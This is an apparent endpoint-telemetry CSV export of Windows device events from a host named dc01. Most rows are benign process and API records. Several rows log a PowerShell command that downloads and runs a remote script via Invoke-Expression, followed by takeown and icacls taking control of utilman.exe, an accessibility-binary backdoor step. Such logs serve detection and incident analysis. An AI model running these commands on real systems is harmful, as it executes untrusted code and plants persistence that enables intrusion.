Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,SHA256,MD5,FileSize,AccountDomain,AccountName,AccountSid,RemoteUrl,ProcessId,ProcessCommandLine,ProcessCreationTime,ProcessTokenElevation,LogonId,LocalIP,LocalPort,FileOriginUrl,FileOriginIP,InitiatingProcessSHA1,InitiatingProcessSHA256,InitiatingProcessMD5,InitiatingProcessFileName,InitiatingProcessFileSize,InitiatingProcessFolderPath,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessCreationTime,InitiatingProcessAccountDomain,InitiatingProcessAccountName,InitiatingProcessAccountSid,InitiatingProcessVersionInfoCompanyName,InitiatingProcessVersionInfoProductName,InitiatingProcessVersionInfoProductVersion,InitiatingProcessVersionInfoInternalFileName,InitiatingProcessVersionInfoOriginalFileName,InitiatingProcessVersionInfoFileDescription,InitiatingProcessParentId,InitiatingProcessParentFileName,InitiatingProcessParentCreationTime,InitiatingProcessLogonId,ReportId,AdditionalFields,InitiatingProcessSessionId,IsInitiatingProcessRemoteSession,InitiatingProcessRemoteSessionIP,CreatedProcessSessionId,IsProcessRemoteSession,ProcessRemoteSessionDeviceName,ProcessRemoteSessionIP,InitiatingProcessUniqueId
"Oct 9, 2024 2:52:04 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,0bd0da826b6bd72be02eb0ce043d1961b561d0f3,a90bc268223ef82dca8142a9699dd22375e94c3e85592aba886798697626def9,0eb71a1b44324c689479854b106d8330,runtimebroker.exe,129528,c:\windows\system32\runtimebroker.exe,2980,RuntimeBroker.exe -Embedding,"Oct 9, 2024 2:52:03 PM",dc01,bob,S-1-5-21-827617619-716324038-3096087224-1000,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2520,RuntimeBroker.exe,RuntimeBroker.exe,Runtime Broker,892,svchost.exe,"Oct 9, 2024 2:45:40 PM",0,2061,,3,1,192.168.32.165,,0,,,2814749767106878
"Oct 9, 2024 2:52:04 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,0bd0da826b6bd72be02eb0ce043d1961b561d0f3,a90bc268223ef82dca8142a9699dd22375e94c3e85592aba886798697626def9,0eb71a1b44324c689479854b106d8330,runtimebroker.exe,129528,c:\windows\system32\runtimebroker.exe,2980,RuntimeBroker.exe -Embedding,"Oct 9, 2024 2:52:03 PM",dc01,bob,S-1-5-21-827617619-716324038-3096087224-1000,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2520,RuntimeBroker.exe,RuntimeBroker.exe,Runtime Broker,892,svchost.exe,"Oct 9, 2024 2:45:40 PM",0,2062,,3,1,192.168.32.165,,0,,,2814749767106878
"Oct 9, 2024 2:52:04 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,0bd0da826b6bd72be02eb0ce043d1961b561d0f3,a90bc268223ef82dca8142a9699dd22375e94c3e85592aba886798697626def9,0eb71a1b44324c689479854b106d8330,runtimebroker.exe,129528,c:\windows\system32\runtimebroker.exe,2980,RuntimeBroker.exe -Embedding,"Oct 9, 2024 2:52:03 PM",dc01,bob,S-1-5-21-827617619-716324038-3096087224-1000,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2520,RuntimeBroker.exe,RuntimeBroker.exe,Runtime Broker,892,svchost.exe,"Oct 9, 2024 2:45:40 PM",0,2063,,3,1,192.168.32.165,,0,,,2814749767106878
"Oct 9, 2024 2:52:04 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,DpapiAccessed,,,,,,294,,,,,,,Invalid date,,,,,,,92753a0410d27297fe7090f6dae80dfd02f8c545,1f44b6b12ed835b8332bbbe45190ef3ba274f0c48d59405cc13571370040f354,d26e0d98d0a7e23802b1f4caecb9d3d8,searchapp.exe,3363184,c:\windows\systemapps\microsoft.windows.search_cw5n1h2txyewy\searchapp.exe,2664,"""SearchApp.exe"" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca","Oct 9, 2024 2:52:03 PM",dc01,bob,S-1-5-21-827617619-716324038-3096087224-1000,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2520,SearchApp,SearchApp.exe,Search application,892,svchost.exe,"Oct 9, 2024 2:45:40 PM",0,2065,"{""CallerProcessID"":2664,""Flags"":""CRYPTPROTECT_UI_FORBIDDEN"",""MasterKeyGUID"":""8c1c3b0c-9903-403a-b4ab-3e8b20a97cf1"",""OperationType"":""SPCryptProtect"",""ReturnValue"":0}",3,1,192.168.32.165,,0,,,2814749767106877
"Oct 9, 2024 2:52:04 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NamedPipeEvent,,,,,,,,,S-1-5-21-827617619-716324038-3096087224-1000,,,,Invalid date,,,,,,,03002a3aa2a8a4d3c7155fda80b2eba583539f4c,81386d8f2191d9ba19b60ed7ced053a2062ad710013ee649c81fd10ed43efc59,a6c7663fccf9d2598fee087ad8965226,fsquirt.exe,167936,c:\windows\system32\fsquirt.exe,8228,"""fsquirt.exe"" -Register","Oct 9, 2024 2:52:04 PM",dc01,bob,S-1-5-21-827617619-716324038-3096087224-1000,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2461,fsquirt.exe,fsquirt.exe,,7204,explorer.exe,"Oct 9, 2024 2:51:50 PM",1264645,2114,"{""DesiredAccess"":1180063,""FileOperation"":""File opened"",""NamedPipeEnd"":""Client"",""PipeName"":""\\Device\\NamedPipe\\srvsvc"",""RemoteClientsAccess"":""AcceptRemote"",""SessionId"":3,""ThreadId"":8232}",3,1,192.168.32.165,,0,,,2814749767106882
"Oct 9, 2024 2:52:04 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,ShellLinkCreateFileEvent,Bluetooth File Transfer.LNK,C:\Users\bob\AppData\Roaming\Microsoft\Windows\SendTo,876a40b1d69407d5ce87653eb67459ca5ed56315,ca0755affa77dd59fd98e111145da405f2a68e3928cac44d9e0d20ed2cfcd1ef,aed6a7f007b357e9f7112e916d52c106,,,,,,,,"Oct 9, 2024 2:52:04 PM",,,,,,,03002a3aa2a8a4d3c7155fda80b2eba583539f4c,81386d8f2191d9ba19b60ed7ced053a2062ad710013ee649c81fd10ed43efc59,a6c7663fccf9d2598fee087ad8965226,fsquirt.exe,167936,c:\windows\system32\fsquirt.exe,8228,"""fsquirt.exe"" -Register","Oct 9, 2024 2:52:04 PM",dc01,bob,S-1-5-21-827617619-716324038-3096087224-1000,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2461,fsquirt.exe,fsquirt.exe,,7204,explorer.exe,"Oct 9, 2024 2:51:50 PM",1264645,2079,"{""FileSizeInBytes"":1052,""VolumeGuidPath"":""\\\\?\\Volume{d5fc36be-1640-4c40-b6e7-82e072c0c726}"",""IsOnRemovableMedia"":false,""ShellLinkRunAsAdmin"":false,""ShellLinkWorkingDirectory"":""C:\\Windows\\System32"",""ShellLinkShowCommand"":""SW_SHOWNORMAL""}",3,1,192.168.32.165,,0,,,2814749767106882
"Oct 9, 2024 2:52:04 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\Users\bob\AppData\Roaming\Microsoft\Windows\SendTo\Bluetooth File Transfer.LNK,,,Invalid date,,,,,,,03002a3aa2a8a4d3c7155fda80b2eba583539f4c,81386d8f2191d9ba19b60ed7ced053a2062ad710013ee649c81fd10ed43efc59,a6c7663fccf9d2598fee087ad8965226,fsquirt.exe,167936,c:\windows\system32\fsquirt.exe,8228,"""fsquirt.exe"" -Register","Oct 9, 2024 2:52:04 PM",dc01,bob,S-1-5-21-827617619-716324038-3096087224-1000,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2461,fsquirt.exe,fsquirt.exe,,7204,explorer.exe,"Oct 9, 2024 2:51:50 PM",1264645,2115,{},3,1,192.168.32.165,,0,,,2814749767106882
"Oct 9, 2024 2:52:05 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NamedPipeEvent,,,,,,,,,S-1-5-21-827617619-716324038-3096087224-1000,,,,Invalid date,,,,,,,0bd0da826b6bd72be02eb0ce043d1961b561d0f3,a90bc268223ef82dca8142a9699dd22375e94c3e85592aba886798697626def9,0eb71a1b44324c689479854b106d8330,runtimebroker.exe,129528,c:\windows\system32\runtimebroker.exe,2980,RuntimeBroker.exe -Embedding,"Oct 9, 2024 2:52:03 PM",dc01,bob,S-1-5-21-827617619-716324038-3096087224-1000,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2520,RuntimeBroker.exe,RuntimeBroker.exe,Runtime Broker,892,svchost.exe,"Oct 9, 2024 2:45:40 PM",0,2098,"{""DesiredAccess"":1180063,""FileOperation"":""File opened"",""NamedPipeEnd"":""Client"",""PipeName"":""\\Device\\NamedPipe\\srvsvc"",""RemoteClientsAccess"":""AcceptRemote"",""SessionId"":3,""ThreadId"":8328}",3,1,192.168.32.165,,0,,,2814749767106878
"Oct 9, 2024 2:52:47 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,CreateRemoteThreadApiCall,cmd.exe,C:\Windows\System32,3fbd42e2460c2eeb2dfe115a4468a2b954d24958,,503ee109ce5cac4bd61084cb28fbd200,331776,dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,,2408,"""cmd.exe"" ","Oct 9, 2024 2:51:12 PM",TokenElevationTypeDefault,719343,,,,,7821fb14835083bae87a66ce96b67b261bea6b2b,50cbdbce85014f1042f99d5acdaad88ff268317a605bc3700b2487edd0f2ef0e,a6c9ee45bff7c5e696b07ec41af84541,csrss.exe,37560,C:\Windows\System32,3008,"csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","Oct 9, 2024 2:47:49 PM",nt authority,system,S-1-5-18,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.1,CSRSS.Exe,CSRSS.Exe,Client Server Runtime Process,2896,smss.exe,"Oct 9, 2024 2:47:49 PM",0,2173,"{""IntegrityLevel"":12288}",2,0,,2,1,TS-MF-01,10.46.20.243,2814749767106734
"Oct 9, 2024 2:52:51 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk,,,Invalid date,,,,,,,4490732cbe530d9f0d52bae029444b50e1cb5057,b5050e0661db175ca19cec51930637184cb01c8c6683633aee168d56f273ac08,ce1e7afe7a17be31473db3cb84d4e806,explorer.exe,4839992,c:\windows\explorer.exe,6016,Explorer.EXE,"Oct 9, 2024 2:47:54 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2582,explorer,EXPLORER.EXE,Windows Explorer,6000,userinit.exe,"Oct 9, 2024 2:47:54 PM",0,2180,{},2,1,10.46.20.243,,0,,,2814749767106764
"Oct 9, 2024 2:52:51 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2181,,2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:52:51 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk,,,Invalid date,,,,,,,16e64043c60112957a1f8c9ffb3eb463a60058a0,b30426f225c10993891e33fb189714e1b9dfc1f45919a05a1e0a9db4313497e4,a0d79d2144d0fce3671b4aca5f1cf395,conhost.exe,987136,c:\windows\system32\conhost.exe,9196,conhost.exe 0xffffffff -ForceV1,"Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2520,ConHost,CONHOST.EXE,Console Window Host,9180,powershell.exe,"Oct 9, 2024 2:52:51 PM",0,2182,{},2,1,10.46.20.243,,0,,,2814749767106894
"Oct 9, 2024 2:52:51 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2183,,2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:52:51 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2184,,2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:52:52 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,BrowserLaunchedToOpenUrl,,,,,,,,,,C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2188,{},2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:52:52 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NamedPipeEvent,,,,,,,,,S-1-5-21-827617619-716324038-3096087224-500,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2189,"{""DesiredAccess"":1180063,""FileOperation"":""File opened"",""NamedPipeEnd"":""Client"",""PipeName"":""\\Device\\NamedPipe\\srvsvc"",""RemoteClientsAccess"":""AcceptRemote"",""SessionId"":2,""ThreadId"":9184}",2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:52:55 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2190,,2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:52:55 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2191,,2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:52:55 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2192,,2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:53:08 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,ProcessPrimaryTokenModified,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,C:\Windows\SysWOW64\WindowsPowerShell\v1.0,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2208,"{""TokenModificationProperties"":""{\""tokenChangeDescription\"":\""Privileges were added to the process token of an unknown process\"",\""privilegesFlags\"":[],\""isChangedToSystemToken\"":false,\""originalTokenIntegrityLevelName\"":\""High\"",\""currentTokenIntegrityLevelName\"":\""High\""}"",""SystemTokenPointer"":""18446670970133063584"",""OriginalTokenIntegrityLevel"":""12288"",""OriginalTokenPointer"":""18446670970270699616"",""OriginalTokenPrivEnabled"":""1619001344"",""OriginalTokenPrivPresent"":""130793013024"",""OriginalTokenSource"":""VXNlcjMyIAA="",""OriginalTokenUserSid"":""S-1-5-21-827617619-716324038-3096087224-500"",""CurrentTokenIntegrityLevel"":""12288"",""CurrentTokenPointer"":""18446670970270699616"",""CurrentTokenPrivEnabled"":""1620049920"",""CurrentTokenSource"":""VXNlcjMyIAA="",""CurrentTokenUserSid"":""S-1-5-21-827617619-716324038-3096087224-500""}",2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:53:15 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2232,"{""Command"":""prompt""}",2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:53:15 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2233,"{""Command"":""PSConsoleHostReadLine""}",2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:53:28 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2254,"{""Command"":""Invoke-Expression (Invoke-WebRequest -Uri \""https://raw.githubusercontent.com/marcusforsberg-truesec/power-tool/refs/heads/main/tool.ps1\"").Content""}",2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:53:48 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,GetClipboardData,,,,,,,,,,,,,Invalid date,,,,,,,c725432e6a5a9c19a84c32fb21ea4667f46fd788,37bf804aa4a3222ce967afb707bc5fce7efea9d7cf60272f1bf7c2f26c4cb055,a5cd2a6f006cf829b9267b88b5a9c73a,rdpclip.exe,602112,c:\windows\system32\rdpclip.exe,5228,rdpclip,"Oct 9, 2024 2:47:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2760,rdpclip.exe,rdpclip.exe,RDP Clipboard Monitor,520,svchost.exe,"Oct 9, 2024 2:45:40 PM",0,2275,,2,1,10.46.20.243,,0,,,2814749767106749
"Oct 9, 2024 2:53:57 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,PowerShellCommand,,,,,,,,,,,,,Invalid date,,,,,,,1fe7d902880466ba61b24986cf74b35ad9a23605,d47f276a8d1dd9af66d1928976c155a808e94e01bcded704b4fd000f108821ad,e77e23a3902e59b6e20856719f1aa5e5,powershell.exe,423424,c:\windows\syswow64\windowspowershell\v1.0\powershell.exe,9180,"""powershell.exe"" ","Oct 9, 2024 2:52:51 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.2340,POWERSHELL,PowerShell.EXE,Windows PowerShell,6016,explorer.exe,"Oct 9, 2024 2:47:54 PM",0,2286,"{""Command"":""Invoke-Expression (Invoke-WebRequest -Uri \""https://raw.githubusercontent.com/marcusforsberg-truesec/power-tool/refs/heads/main/tool.ps1\"" -UseBasicParsing).Content""}",2,1,10.46.20.243,,0,,,2814749767106893
"Oct 9, 2024 2:53:57 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,84698d6ec17e27dd3ec26e42b6c4ba622ef5877f,83587f8378831f3e26bfec60513f34c576ced4a9270a4a2507236ba345bdffe0,de3319c7cdc74f7068c3fc825ded72d8,takeown.exe,52736,c:\windows\syswow64\takeown.exe,4552,"""takeown.exe"" /f C:\Windows\System32\utilman.exe","Oct 9, 2024 2:53:57 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.1,takeown.exe,takeown.exe,Takes ownership of a file,9180,powershell.exe,"Oct 9, 2024 2:52:51 PM",719343,2288,,2,1,10.46.20.243,,0,,,2814749767106896
"Oct 9, 2024 2:53:57 PM",519c3f1d95fc1de87e9e09a9884365b64c2fe50e,dc01,NtProtectVirtualMemoryApiCall,,,,,,,,,,,,,Invalid date,,,,,,,d9557d11fcce0a7a67d9b1e305215080f50ded74,1e2b7808c4787a8a3048816eac9f0017abadecd777bada7ac30069907801daa2,a95d51bf18af4205852eb85db67bb33c,icacls.exe,30208,c:\windows\syswow64\icacls.exe,2036,"""icacls.exe"" C:\Windows\System32\utilman.exe /grant alice:F","Oct 9, 2024 2:53:57 PM",dc01,alice,S-1-5-21-827617619-716324038-3096087224-500,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.20348.1,icacls,iCACLS.EXE,,9180,powershell.exe,"Oct 9, 2024 2:52:51 PM",719343,2304,,2,1,10.46.20.243,,0,,,2814749767106897
